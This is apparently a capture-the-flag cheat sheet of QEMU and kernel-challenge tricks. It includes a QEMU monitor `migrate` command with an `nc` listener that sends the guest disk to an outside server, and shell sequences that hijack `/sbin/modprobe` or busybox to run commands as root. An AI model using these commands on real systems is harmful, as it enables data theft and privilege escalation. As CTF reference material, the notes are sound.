# Abusing QEMU Monitor
`^A c` to toggle QEMU monitor. 

## Using `migrate`
If QEMU has internet access, you can use the `migrate` command to send the contents of the entire disk to your own server.
First, listen for connections on your server
```sh
nc -lvnp 8888 > qemu.out
```
Then go into QEMU Monitor in the challenge and run
```
migrate tcp:IP:8888
```
Then you can just grep for the flag in the resulting `qemu.out` file.

## Using memory access
If you cannot get the flag with the above method, you can at least use QEMU Monitor to get direct read access to the memory.
* `info registers` to get registers
* `info mem` to get vmmap
* `info mtree` for physical mappings
* `x/gx addr` to print virtual memory
* `xp/gx addr` to print physical memory

If the flag is in memory, this can be used to get it. Otherwise, it can at least be used to get leak.

# Abusing write-access
## Write-access to `/sbin`
```sh
echo -en '\xff\xff\xff\xff' > /tmp/dummy
chmod +x /tmp/dummy
mv /sbin/modprobe /tmp
echo -en '#!/bin/sh\nchmod 777 /flag\n' > /sbin/modprobe
chmod +x /sbin/modprobe
/tmp/dummy
cat /flag
```

## Write-access to `/`
```sh
echo -en '\xff\xff\xff\xff' > /tmp/dummy
chmod +x /tmp/dummy
mv /sbin /tmp/sbin
mkdir /sbin
echo -en '#!/bin/sh\nchmod 777 /flag\n' > /sbin/modprobe
chmod +x /sbin/modprobe
/tmp/dummy
cat /flag
```

## Write-access to `/bin`
Usually `/sbin/modprobe` points to `/bin/busybox`
```sh
echo -en '\xff\xff\xff\xff' > /tmp/dummy
chmod +x /tmp/dummy
cp /bin/busybox /bin/busybox2
ln -sf busybox2 /bin/cat 
ln -sf busybox2 /bin/chmod 
ln -sf busybox2 /bin/sh
echo -en '#!/bin/sh\nchmod 777 /flag\n' > /tmp/busybox
chmod +x /tmp/busybox
mv -f /tmp/busybox /bin/busybox
/tmp/dummy
cat /flag
```
